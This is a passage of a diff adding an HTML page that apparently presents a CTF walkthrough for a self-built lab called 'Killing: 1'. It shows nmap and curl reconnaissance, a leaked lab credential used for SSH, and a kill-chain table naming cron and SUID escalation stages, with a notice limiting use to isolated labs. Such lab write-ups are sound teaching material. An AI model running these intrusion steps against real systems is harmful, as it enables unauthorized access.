+      color: var(--text-primary);
+      transition: all var(--transition-standard);
+    }
+
+    .skill-badge:hover {
+      border-color: var(--accent-danger);
+      background: var(--bg-panel-elevated);
+      transform: translateY(-1px);
+    }
+
+    .skill-badge svg {
+      color: var(--accent-danger);
+    }
+
+    /* ==========================================================================
+       FOOTER
+       ========================================================================== */
+    .site-footer {
+      margin-top: auto;
+      background: #080a0c;
+      border-top: 1px solid var(--border-subtle);
+      padding: 3rem 0 2.5rem;
+      font-size: 0.86rem;
+    }
+
+    .footer-grid {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 2rem;
+      flex-wrap: wrap;
+    }
+
+    .footer-brand-col {
+      max-width: 460px;
+    }
+
+    .footer-title {
+      font-family: var(--font-mono);
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .footer-sub {
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .footer-disclaimer-mini {
+      font-size: 0.76rem;
+      color: var(--text-muted);
+      line-height: 1.45;
+      border-left: 2px solid var(--accent-danger);
+      padding-left: 0.65rem;
+    }
+
+    .footer-links-col {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      align-items: flex-end;
+    }
+
+    .footer-links-col a {
+      color: var(--text-secondary);
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.45rem;
+    }
+
+    .footer-links-col a:hover {
+      color: var(--text-primary);
+    }
+
+    .footer-copyright {
+      margin-top: 2rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid rgba(31, 42, 48, 0.4);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    /* ==========================================================================
+       RESPONSIVENESS & ACCESSIBILITY
+       ========================================================================== */
+    @media (max-width: 860px) {
+      .overview-grid {
+        grid-template-columns: 1fr;
+      }
+      .footer-links-col {
+        align-items: flex-start;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .chain-flow {
+        flex-direction: column;
+        min-width: 100%;
+        gap: 0.5rem;
+      }
+      .chain-node {
+        width: 100%;
+        flex-direction: row;
+        justify-content: space-between;
+        padding: 0.75rem 1rem;
+      }
+      .chain-connector {
+        transform: rotate(90deg);
+        margin: -0.25rem 0;
+      }
+      .stage-header {
+        padding: 1rem 1.1rem;
+      }
+      .stage-body {
+        padding: 0.5rem 1.1rem 1.5rem;
+      }
+      .stage-header-left {
+        gap: 0.75rem;
+      }
+      .terminal-code {
+        font-size: 0.8rem;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+        scroll-behavior: auto !important;
+      }
+      .hero {
+        opacity: 1 !important;
+        transform: none !important;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ==========================================================================
+       NAVBAR
+       ========================================================================== -->
+  <header class="site-nav" id="topNav">
+    <div class="container nav-inner">
+      <a href="#hero" class="nav-brand" aria-label="Killing: 1 CTF Report">
+        <span class="nav-brand-dot"></span>
+        <span>Killing: 1</span>
+        <span class="nav-brand-sub">Security Report</span>
+      </a>
+
+      <div class="nav-controls">
+        <div class="progress-pill" title="Overall walkthrough completion">
+          <span>Attack Progress</span>
+          <div class="progress-meter" aria-hidden="true">
+            <div class="progress-bar-fill" id="globalProgressBar"></div>
+          </div>
+          <span id="progressPercent">0%</span>
+        </div>
+
+        <a href="https://github.com/MohammedRifad123/killing-dark-access" target="_blank" rel="noopener noreferrer" class="nav-link-btn" id="navGithubLink">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+          <span>GitHub Repo</span>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- ==========================================================================
+         HERO SECTION
+         ========================================================================== -->
+    <section class="hero" id="hero" aria-labelledby="heroTitle">
+      <div class="container">
+        <div class="hero-meta-bar">
+          <span class="badge-difficulty">Medium-Hard</span>
+          <span class="lab-status-badge">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 14 14"></polyline></svg>
+            Estimated Time: ~2 Hours
+          </span>
+          <span class="lab-status-badge">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg>
+            Target: Lubuntu 24.04 LTS
+          </span>
+        </div>
+
+        <h1 class="hero-title" id="heroTitle">
+          Killing: <span class="title-accent">1</span>
+        </h1>
+        <p class="hero-subtitle">
+          A boot-to-root CTF — from hidden web page to root shell.
+        </p>
+
+        <!-- Stat Chips -->
+        <div class="stat-chips-group">
+          <div class="stat-chip">
+            <span class="stat-chip-icon">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg>
+            </span>
+            <span>3 Flags</span>
+          </div>
+
+          <div class="stat-chip">
+            <span class="stat-chip-icon">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
+            </span>
+            <span>5 Stages</span>
+          </div>
+
+          <div class="stat-chip">
+            <span class="stat-chip-icon">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"></rect><rect x="9" y="9" width="6" height="6"></rect><line x1="9" y1="1" x2="9" y2="4"></line><line x1="15" y1="1" x2="15" y2="4"></line><line x1="9" y1="20" x2="9" y2="23"></line><line x1="15" y1="20" x2="15" y2="23"></line><line x1="20" y1="9" x2="23" y2="9"></line><line x1="20" y1="14" x2="23" y2="14"></line><line x1="1" y1="9" x2="4" y2="9"></line><line x1="1" y1="14" x2="4" y2="14"></line></svg>
+            </span>
+            <span>Linux</span>
+          </div>
+        </div>
+
+        <!-- CTA Buttons -->
+        <div class="hero-actions">
+          <a href="#walkthrough" class="btn btn-primary" id="ctaWalkthrough">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+            <span>View Walkthrough</span>
+          </a>
+          <a href="#matrix" class="btn btn-secondary" id="ctaMatrix">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="3" y1="9" x2="21" y2="9"></line><line x1="3" y1="15" x2="21" y2="15"></line><line x1="9" y1="3" x2="9" y2="21"></line><line x1="15" y1="3" x2="15" y2="21"></line></svg>
+            <span>Kill-Chain Matrix</span>
+          </a>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================================================
+         OVERVIEW SECTION
+         ========================================================================== -->
+    <section class="section-wrapper" id="overview">
+      <div class="container">
+        <div class="section-header">
+          <div class="section-eyebrow">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+            <span>Lab Architecture</span>
+          </div>
+          <h2 class="section-title">Overview & Lab Specifications</h2>
+          <p class="section-desc">
+            This machine is designed as an isolated VirtualBox lab pairing a Lubuntu 24.04 target with a Kali Linux attack machine, explicitly constructed to teach real-world enumeration patterns and multi-tier Linux privilege escalation.
+          </p>
+        </div>
+
+        <div class="overview-grid">
+          <div class="panel-card">
+            <div class="card-title-sm">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+              <span>Lab Requirements</span>
+            </div>
+            <ul class="requirements-list">
+              <li>
+                <span class="req-bullet">›</span>
+                <span><strong>Hypervisor:</strong> Oracle VM VirtualBox (v7.0+)</span>
+              </li>
+              <li>
+                <span class="req-bullet">›</span>
+                <span><strong>Attacker VM:</strong> Kali Linux (or Parrot OS)</span>
+              </li>
+              <li>
+                <span class="req-bullet">›</span>
+                <span><strong>Target Base ISO:</strong> Lubuntu 24.04 LTS Desktop / Server</span>
+              </li>
+              <li>
+                <span class="req-bullet">›</span>
+                <span><strong>Networking:</strong> Host-Only Adapter or Isolated Internal Network</span>
+              </li>
+            </ul>
+          </div>
+
+          <div class="panel-card">
+            <div class="card-title-sm">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+              <span>Target Parameters</span>
+            </div>
+            <table class="specs-table">
+              <tbody>
+                <tr>
+                  <td class="spec-key">Target Machine:</td>
+                  <td class="spec-val">Killing: 1 (Lubuntu 24.04)</td>
+                </tr>
+                <tr>
+                  <td class="spec-key">Network Mode:</td>
+                  <td class="spec-val">Host-Only / 192.168.56.0/24 (or 10.0.2.15 NAT)</td>
+                </tr>
+                <tr>
+                  <td class="spec-key">Attack Surface:</td>
+                  <td class="spec-val">HTTP (80), OpenSSH (22)</td>
+                </tr>
+                <tr>
+                  <td class="spec-key">Total Flags:</td>
+                  <td class="spec-val">3 (User1, User2, Root)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Authorized Testing Notice Callout -->
+        <div class="disclaimer-box" role="alert">
+          <div class="disclaimer-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+          </div>
+          <div>
+            <div class="disclaimer-title">Authorized Testing Notice</div>
+            <div class="disclaimer-text">
+              For authorized, isolated lab use only. Do not run attacks against systems you don't own or have explicit, written permission to test. All tools and techniques presented here are for defensive education and ethical security research.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================================================
+         2. KILL-CHAIN PROGRESSION MATRIX
+         ========================================================================== -->
+    <section class="section-wrapper" id="matrix">
+      <div class="container">
+        <div class="section-header">
+          <div class="section-eyebrow">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 14 14"></polyline></svg>
+            <span>Section 2</span>
+          </div>
+          <h2 class="section-title">2. Kill-Chain Progression Matrix</h2>
+          <p class="section-desc">
+            End-to-end tactical progression mapping initial unauthenticated web profiling through lateral movement and full root takeover.
+          </p>
+        </div>
+
+        <div class="matrix-card">
+          <div class="matrix-table-wrap">
+            <table class="matrix-table">
+              <thead>
+                <tr>
+                  <th>Attack Phase</th>
+                  <th>Tactical Focus</th>
+                  <th>System Access Level Obtained</th>
+                  <th>Captured Tokens / Flags</th>
+                  <th>Status</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><span class="phase-badge">Phase 01</span></td>
+                  <td>External Web Infrastructure Reconnaissance</td>
+                  <td><span class="access-pill">Unauthenticated Network Actor</span></td>
+                  <td><span class="matrix-token none">None</span></td>
+                  <td><span class="status-completed-pill">COMPLETED</span></td>
+                </tr>
+                <tr>
+                  <td><span class="phase-badge">Phase 02</span></td>
+                  <td>Staging Directory Information Leak Capture</td>
+                  <td><span class="access-pill">Directory Content Read Access</span></td>
+                  <td><span class="matrix-token none">None</span></td>
+                  <td><span class="status-completed-pill">COMPLETED</span></td>
+                </tr>
+                <tr>
+                  <td><span class="phase-badge">Phase 03</span></td>
+                  <td>SSH Perimeter Intrusion Verification</td>
+                  <td><span class="access-pill">Local Shell Access (<code>user1</code>)</span></td>
+                  <td>
+                    <span class="matrix-token">
+                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg>
+                      flag{found_the_leaked_creds}
+                    </span>
+                  </td>
+                  <td><span class="status-completed-pill">COMPLETED</span></td>
+                </tr>
+                <tr>
+                  <td><span class="phase-badge">Phase 04</span></td>
+                  <td>Cron Pipeline Script Misconfiguration Abuse</td>
+                  <td><span class="access-pill">Lateral Account Shell Access (<code>user2</code>)</span></td>
+                  <td>
+                    <span class="matrix-token">
+                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg>
+                      flag{pivoted_via_cron}
+                    </span>
+                  </td>
+                  <td><span class="status-completed-pill">COMPLETED</span></td>
+                </tr>
+                <tr>
+                  <td><span class="phase-badge">Phase 05</span></td>
+                  <td>High-Privilege SUID Binary Hijack</td>
+                  <td><span class="access-pill root-level">Absolute System Operator (<code>root</code>)</span></td>
+                  <td>
+                    <span class="matrix-token">
+                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+                      flag{root_via_suid}
+                    </span>
+                  </td>
+                  <td><span class="status-completed-pill">COMPLETED</span></td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================================================
+         ATTACK CHAIN INTERACTIVE FLOW DIAGRAM
+         ========================================================================== -->
+    <section class="section-wrapper" id="attackChain">
+      <div class="container">
+        <div class="section-header">
+          <div class="section-eyebrow">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+            <span>Interactive Visual Navigation</span>
+          </div>
+          <h2 class="section-title">Attack Chain Flow</h2>
+          <p class="section-desc">
+            Click any phase to navigate directly to its stage in the interactive technical walkthrough below.
+          </p>
+        </div>
+
+        <div class="chain-container">
+          <nav class="chain-flow" aria-label="Attack chain navigation">
+            <a href="#stage-1" class="chain-node" data-target="stage-1" id="chainNode1">
+              <span class="chain-node-stage">Phase 01</span>
+              <span class="chain-node-title">Web Enum</span>
+              <span class="chain-node-status" id="chainStatus1">
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle></svg>
+                <span>Pending</span>
+              </span>
+            </a>
+
+            <div class="chain-connector" aria-hidden="true">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+
+            <a href="#stage-2" class="chain-node" data-target="stage-2" id="chainNode2">
+              <span class="chain-node-stage">Phase 02</span>
+              <span class="chain-node-title">Leaked Creds</span>
+              <span class="chain-node-status" id="chainStatus2">
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle></svg>
+                <span>Pending</span>
+              </span>
+            </a>
+
+            <div class="chain-connector" aria-hidden="true">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+
+            <a href="#stage-3" class="chain-node" data-target="stage-3" id="chainNode3">
+              <span class="chain-node-stage">Phase 03</span>
+              <span class="chain-node-title">SSH Access</span>
+              <span class="chain-node-status" id="chainStatus3">
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle></svg>
+                <span>Pending</span>
+              </span>
+            </a>
+
+            <div class="chain-connector" aria-hidden="true">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+
+            <a href="#stage-4" class="chain-node" data-target="stage-4" id="chainNode4">
+              <span class="chain-node-stage">Phase 04</span>
+              <span class="chain-node-title">Cron Pivot</span>
+              <span class="chain-node-status" id="chainStatus4">
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle></svg>
+                <span>Pending</span>
+              </span>
+            </a>
+
+            <div class="chain-connector" aria-hidden="true">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>
+            </div>
+
+            <a href="#stage-5" class="chain-node" data-target="stage-5" id="chainNode5">
+              <span class="chain-node-stage">Phase 05</span>
+              <span class="chain-node-title">SUID Root</span>
+              <span class="chain-node-status" id="chainStatus5">
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle></svg>
+                <span>Pending</span>
+              </span>
+            </a>
+          </nav>
+          <div class="chain-hint">
+            <span>Tip: Click any node to expand and jump directly to that attack phase. Check off stages as you replicate them.</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==========================================================================
+         3. TECHNICAL WALKTHROUGH & EXPLOITATION LIFECYCLE
+         ========================================================================== -->
+    <section class="section-wrapper" id="walkthrough">
+      <div class="container">
+        <div class="section-header">
+          <div class="section-eyebrow">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+            <span>Section 3</span>
+          </div>
+          <h2 class="section-title">3. Technical Walkthrough & Exploitation Lifecycle</h2>
+          <p class="section-desc">
+            Complete step-by-step reproduction guide detailing commands, expected outputs, forensic analysis, and flag discovery across all privilege levels.
+          </p>
+        </div>
+
+        <div class="walkthrough-toolbar">
+          <div class="walkthrough-meta">
+            <span>Progress: <strong id="completedStagesCount">0</strong> / 5 Stages Completed</span>
+            <span>•</span>
+            <span>Flags: <strong id="flagsCapturedCount">0</strong> / 3 Captured</span>
+          </div>
+          <div class="toolbar-actions">
+            <button type="button" class="btn-tool" id="btnExpandAll">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="7 13 12 18 17 13"></polyline><polyline points="7 6 12 11 17 6"></polyline></svg>
+              <span>Expand All</span>
+            </button>
+            <button type="button" class="btn-tool" id="btnCollapseAll">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline></svg>
+              <span>Collapse All</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="stage-list" id="stageList">
+
+          <!-- STAGE 1 (3.1): Initial Service Probing -->
+          <article class="stage-item open" id="stage-1" data-stage="1">
+            <header class="stage-header" tabindex="0" role="button" aria-expanded="true" aria-controls="content-stage-1">
+              <div class="stage-header-left">
+                <div class="stage-index-badge">3.1</div>
+                <div class="stage-header-text">
+                  <div class="stage-tagline">Phase 01 • External Reconnaissance</div>
+                  <h3 class="stage-title">3.1 Initial Service Probing & Attack Surface Mapping</h3>
+                </div>
+              </div>
+              <div class="stage-header-right">
+                <button type="button" class="step-check-btn" data-step="1" title="Mark Stage 3.1 as completed" aria-label="Mark Stage 3.1 as completed">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                  <span class="check-text">Complete</span>
+                </button>
+                <div class="accordion-chevron" aria-hidden="true">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+              </div>
+            </header>
+
+            <div class="stage-content-wrapper" id="content-stage-1">
+              <div class="stage-content-inner">
+                <div class="stage-body">
+                  <p>
+                    An aggressive full-port SYN stealth scan was initiated against the host interface to profile exposed listener endpoints and retrieve daemon banner strings.
+                  </p>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">attacker@kali:~</span>
+                      <button type="button" class="copy-btn" data-copy="nmap -sV -p- 192.168.56.101" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">attacker@kali:~$ </span>nmap -sV -p- 192.168.56.101
+<span class="code-comment"># Nmap 7.94 scan initiated: SYN Stealth Scan with Version Probing</span>
+<span class="code-output">Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-22 10:14 UTC
+Nmap scan report for 192.168.56.101
+Host is up (0.00045s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre>
+                  </div>
+
+                  <div class="note-box">
+                    <strong>Analysis Deduction:</strong> TCP Port 22 handles remote access requiring prior authentication. Consequently, the exposed Apache web engine running on TCP Port 80 serves as our initial vector for entry mapping.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+
+          <!-- STAGE 2: Web Enumeration & robots.txt Riddle Hint -->
+          <article class="stage-item" id="stage-2" data-stage="2">
+            <header class="stage-header" tabindex="0" role="button" aria-expanded="false" aria-controls="content-stage-2">
+              <div class="stage-header-left">
+                <div class="stage-index-badge">3.2a</div>
+                <div class="stage-header-text">
+                  <div class="stage-tagline">Phase 02 • Information Leak Discovery</div>
+                  <h3 class="stage-title">Web Enumeration & Staging Notes Discovery</h3>
+                </div>
+              </div>
+              <div class="stage-header-right">
+                <button type="button" class="step-check-btn" data-step="2" title="Mark Stage as completed" aria-label="Mark Stage as completed">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                  <span class="check-text">Complete</span>
+                </button>
+                <div class="accordion-chevron" aria-hidden="true">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+              </div>
+            </header>
+
+            <div class="stage-content-wrapper" id="content-stage-2">
+              <div class="stage-content-inner">
+                <div class="stage-body">
+                  <p>
+                    Check <span class="inline-code">robots.txt</span> first — standard web directives that frequently leak paths meant to be hidden from search engines.
+                  </p>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">curl http://192.168.56.101/robots.txt</span>
+                      <button type="button" class="copy-btn" data-copy="curl -s http://192.168.56.101/robots.txt" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">attacker@kali:~$ </span>curl -s http://192.168.56.101/robots.txt
+<span class="code-output">User-agent: *
+Disallow: /dev_vault_backup/
+# Riddle hint: "What was once forgotten in the vault shall unlock the gate..."</span></pre>
+                  </div>
+
+                  <p>
+                    Navigating to <span class="inline-code">http://192.168.56.101/dev_vault_backup/notes.txt</span> exposes plaintext migration notes with leaked credentials:
+                  </p>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">curl http://192.168.56.101/dev_vault_backup/notes.txt</span>
+                      <button type="button" class="copy-btn" data-copy="curl -s http://192.168.56.101/dev_vault_backup/notes.txt" title="Copy command">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        <span>Copy</span>
+                      </button>
+                    </div>
+                    <pre class="terminal-code"><span class="code-prompt">attacker@kali:~$ </span>curl -s http://192.168.56.101/dev_vault_backup/notes.txt
+<span class="code-output">[SYSTEM MIGRATION NOTE]
+Remember to cycle default credentials once the deployment verifies:
+SSH account: user1
+Password:    <span class="code-highlight">Spring2026!</span></span></pre>
+                  </div>
+
+                  <div class="note-box success-note">
+                    <strong>Discovery:</strong> Leaked SSH credentials acquired: username <span class="inline-code">user1</span> and password <span class="inline-code">Spring2026!</span>.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </article>
+
+          <!-- STAGE 3 (3.2): Perimeter Intrusion & Verification of Token 01 -->
+          <article class="stage-item" id="stage-3" data-stage="3">
+            <header class="stage-header" tabindex="0" role="button" aria-expanded="false" aria-controls="content-stage-3">
+              <div class="stage-header-left">
+                <div class="stage-index-badge">3.2</div>
+                <div class="stage-header-text">
+                  <div class="stage-tagline">
+                    <span>Phase 03 • SSH Foothold</span>
+                    <span class="flag-indicator-pill">Flag 1</span>
+                  </div>
+                  <h3 class="stage-title">3.2 Perimeter Intrusion & Verification of Token 01</h3>
+                </div>
+              </div>
+              <div class="stage-header-right">
+                <button type="button" class="step-check-btn" data-step="3" title="Mark Stage 3.2 as completed" aria-label="Mark Stage 3.2 as completed">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                  <span class="check-text">Complete</span>
+                </button>
+                <div class="accordion-chevron" aria-hidden="true">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+              </div>
+            </header>
+
+            <div class="stage-content-wrapper" id="content-stage-3">
+              <div class="stage-content-inner">
+                <div class="stage-body">
+                  <p>
+                    Web application analysis exposed an unlinked staging deployment folder containing system configuration notes. These notes leaked active plaintext credentials assigned to the local account <span class="inline-code">user1</span>: <span class="inline-code">[Spring2026!]</span>.
+                  </p>
+
+                  <div class="step-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    Command Sequence & Terminal Buffer Output
+                  </div>
+
+                  <div class="terminal-container">
+                    <div class="terminal-bar">
+                      <div class="terminal-dots">
+                        <span class="terminal-dot dot-red"></span>
+                        <span class="terminal-dot dot-yellow"></span>
+                        <span class="terminal-dot dot-green"></span>
+                      </div>
+                      <span class="terminal-title">SSH Login (user1)</span>
+                      <button type="button" class="copy-btn" data-copy="ssh user1@10.0.2.15" title="Copy command">
